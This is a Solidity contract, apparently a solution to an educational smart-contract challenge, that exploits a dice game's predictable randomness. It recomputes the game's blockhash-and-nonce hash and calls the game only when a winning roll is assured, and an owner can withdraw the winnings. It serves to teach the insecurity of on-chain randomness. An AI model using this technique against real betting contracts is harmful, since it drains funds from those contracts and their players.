pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_addr != address(0), "Invalid address");
        require(address(this).balance >= _amount, "Insufficient balance");
        (bool sent, ) = payable(_addr).call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "Not enough balance to roll");                                                                            
        
        // Get the current nonce from DiceGame
        uint256 currentNonce = diceGame.nonce();
        
        // Predict the roll using the same logic as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), currentNonce));                                                                  
        uint256 roll = uint256(hash) % 16;
        
        console.log("\t", "   Predicted Roll:", roll);
        
        // Only roll if we're guaranteed to win (roll <= 5), otherwise revert
        require(roll <= 5, "Predicted roll is greater than 5");
        
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    receive() external payable {}
}
